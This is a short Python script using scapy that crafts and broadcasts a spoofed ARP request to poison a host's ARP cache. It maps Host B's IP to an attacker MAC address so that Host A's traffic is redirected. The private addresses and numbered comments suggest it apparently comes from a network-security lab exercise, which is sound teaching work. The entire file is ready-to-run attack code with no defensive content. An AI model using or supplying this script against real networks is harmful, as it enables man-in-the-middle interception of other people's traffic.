#!/usr/bin/python3

from scapy.all import *

"""
Create ARP poison packet using ARP request
"""
# Create the Ethernet instance
E = Ether()
# Change the Ethernet frame destination MAC address to broadcast address
E.dst = "ff:ff:ff:ff:ff:ff"

# Create the ARP packet instance
A = ARP()
# 1. Change the source IP address to the Host B IP address
# 2. Change the destionation IP address to Host A IP address
# 3. Change the source MAC address to attacker MAC address
# 4. Change the destination MAC address to 00:00:00:00:00:00
# 5. Set the ARP opcode to 1 (request)
hostA_IP = "10.0.2.5"
hostB_IP = "10.0.2.6"
attacker_MAC_addr = "08:00:27:58:67:fa"
broadcast_addr = "00:00:00:00:00:00"
arp_request_code = 1
A.psrc = hostB_IP
A.pdst = hostA_IP
A.hwsrc = attacker_MAC_addr
A.hwdst = broadcast_addr
A.op = arp_request_code

# Create ARP packet instance
pkt = E/A

# Send ARP packet
sendp(pkt)
